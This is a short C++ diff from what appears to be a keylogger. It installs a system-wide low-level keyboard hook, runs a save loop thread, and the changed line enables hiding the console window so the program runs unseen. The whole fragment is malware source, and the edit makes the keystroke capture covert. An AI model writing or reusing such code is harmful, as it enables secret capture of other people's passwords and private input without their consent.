@@ -9,7 +9,7 @@ int main() {
 	t[1] = std::thread(saveLoop);
 	
 
-	// ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	HHOOK KeyboardHook;
 	KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 	MSG msg;
